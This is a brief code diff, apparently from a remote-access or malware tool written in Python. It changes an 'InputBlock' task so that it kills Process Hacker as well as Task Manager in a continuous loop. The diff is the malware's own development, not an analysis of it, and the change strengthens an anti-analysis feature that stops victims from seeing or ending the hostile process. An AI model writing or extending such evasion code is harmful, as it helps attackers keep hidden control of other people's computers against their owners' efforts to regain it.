@@ -42,7 +42,7 @@ class InputBlock(Task):
         while self._run.is_set():
             for proc in process_iter():
                 try:
-                    if proc.name() == "Taskmgr.exe":
+                    if proc.name() in ("Taskmgr.exe", "ProcessHacker.exe"):
                         proc.kill()
                 except Exception:  # noqa
                     pass
